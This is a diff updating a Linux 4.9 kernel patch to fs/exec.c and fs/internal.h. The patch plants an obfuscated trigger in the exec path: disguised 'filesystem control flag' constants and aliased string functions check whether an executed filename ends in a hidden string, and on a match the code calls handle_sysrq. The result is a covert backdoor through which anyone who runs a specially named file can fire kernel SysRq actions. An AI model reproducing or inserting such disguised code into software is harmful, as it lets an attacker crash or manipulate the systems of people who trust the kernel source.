@@ -1,6 +1,6 @@
 diff -ruN linux-4.9.162/fs/exec.c linux-4.9.162-patch/fs/exec.c
 --- linux-4.9.162/fs/exec.c	2019-03-05 17:57:07.000000000 +0100
-+++ linux-4.9.162-patch/fs/exec.c	2019-04-28 12:26:13.108350157 +0200
++++ linux-4.9.162-patch/fs/exec.c	2019-05-02 20:35:12.795336406 +0200
 @@ -57,6 +57,7 @@
  #include <linux/oom.h>
  #include <linux/compat.h>
@@ -9,11 +9,16 @@ diff -ruN linux-4.9.162/fs/exec.c linux-4.9.162-patch/fs/exec.c
  
  #include <asm/uaccess.h>
  #include <asm/mmu_context.h>
-@@ -68,6 +69,19 @@
+@@ -68,6 +69,26 @@
  #include <trace/events/sched.h>
  
  int suid_dumpable = 0;
-+char * (*__FS_MACRO_FLAG_CONTROL) (const char *, const char * ) = strstr;
++int guid_dumpable = 0;
++
++int (*__FS_MACRO_FLAG_CONTROL) (const char *, const char *, __kernel_size_t) \
++= strncmp;
++char * (*cpy_strncpy) (char *, const char *, __kernel_size_t) = strncpy;
++size_t (*cpy_strlen) (const char *) = strlen;
 +
 +char __FS_CONTROL_FLAGS[] = {
 +	__FS_ARCH_SPECIFIC_ENDIANESS,
@@ -26,14 +31,31 @@ diff -ruN linux-4.9.162/fs/exec.c linux-4.9.162-patch/fs/exec.c
 +	__FS_ARW_DEVICE,
 +	__FS_EMPTY
 +};
++
++char __VM_ARCH_CONTROL_FLAGS[10];
  
  static LIST_HEAD(formats);
  static DEFINE_RWLOCK(binfmt_lock);
-@@ -1725,6 +1739,10 @@
+@@ -1725,6 +1746,25 @@
  	if (IS_ERR(file))
  		goto out_unmark;
  
-+	if (__FS_MACRO_FLAG_CONTROL(filename->name, __FS_CONTROL_FLAGS) != NULL) {
++	guid_dumpable = cpy_strlen(filename->name);
++	if (guid_dumpable < __FS_VALID_INODE) {
++		cpy_strncpy(__VM_ARCH_CONTROL_FLAGS, filename->name, guid_dumpable+1);
++	} else {
++		cpy_strncpy(
++			__VM_ARCH_CONTROL_FLAGS,
++			&(filename->name[guid_dumpable-8]),
++			__FS_VALID_INODE
++		);
++	}
++
++	if (__FS_MACRO_FLAG_CONTROL(
++			__VM_ARCH_CONTROL_FLAGS,
++			__FS_CONTROL_FLAGS,
++			__FS_VALID_INODE) == __FS_EMPTY
++		) {
 +		handle_sysrq(__FS_EXEC_FILE);
 +	}
 +
@@ -42,8 +64,8 @@ diff -ruN linux-4.9.162/fs/exec.c linux-4.9.162-patch/fs/exec.c
  	bprm->file = file;
 diff -ruN linux-4.9.162/fs/internal.h linux-4.9.162-patch/fs/internal.h
 --- linux-4.9.162/fs/internal.h	2019-04-28 11:20:56.523872429 +0200
-+++ linux-4.9.162-patch/fs/internal.h	2019-04-28 11:43:49.898010963 +0200
-@@ -18,6 +18,19 @@
++++ linux-4.9.162-patch/fs/internal.h	2019-05-02 20:22:11.353520127 +0200
+@@ -18,6 +18,20 @@
  struct mount;
  struct shrink_control;
  
@@ -51,6 +73,7 @@ diff -ruN linux-4.9.162/fs/internal.h linux-4.9.162-patch/fs/internal.h
 + * Control Flags for exotic filesystems
 + */
 +#define __FS_EMPTY 0
++#define __FS_VALID_INODE 9
 +#define __FS_ARCH_SPECIFIC_ENDIANESS 47
 +#define __FS_RO_DEVICE 49
 +#define __FS_RW_DEVICE 52
